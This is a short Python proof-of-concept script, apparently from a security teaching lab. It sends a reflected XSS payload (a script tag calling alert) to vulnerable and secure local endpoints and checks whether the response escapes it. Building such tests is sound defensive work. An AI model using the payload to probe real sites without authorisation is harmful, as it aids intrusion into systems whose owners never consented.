#!/usr/bin/env python3
"""
Proof-of-Concept (PoC): Reflected XSS (A03:2021) Exploitation

Demonstrates how unescaped user inputs allow injecting JavaScript tags.
"""

import requests

BASE_URL = "http://127.0.0.1:8000/api/a03-injection"

def test_vulnerable_xss():
    print("[*] Testing VULNERABLE Reflected XSS endpoint...")
    payload = "<script>alert('XSS-Test')</script>"
    url = f"{BASE_URL}/vulnerable/xss?name={payload}"
    
    resp = requests.get(url)
    print(f"    Invoked URL: {url}")
    if payload in resp.text:
        print("[🔴 VULNERABILITY CONFIRMED] Raw unescaped <script> tag rendered directly in HTML response.")

def test_secure_xss():
    print("\n[*] Testing SECURE Reflected XSS endpoint...")
    payload = "<script>alert('XSS-Test')</script>"
    url = f"{BASE_URL}/secure/xss?name={payload}"
    
    resp = requests.get(url)
    print(f"    Invoked URL: {url}")
    if "&lt;script&gt;" in resp.text:
        print("[🟢 PROTECTED] Special HTML characters escaped successfully to HTML entities.")

if __name__ == "__main__":
    test_vulnerable_xss()
    test_secure_xss()
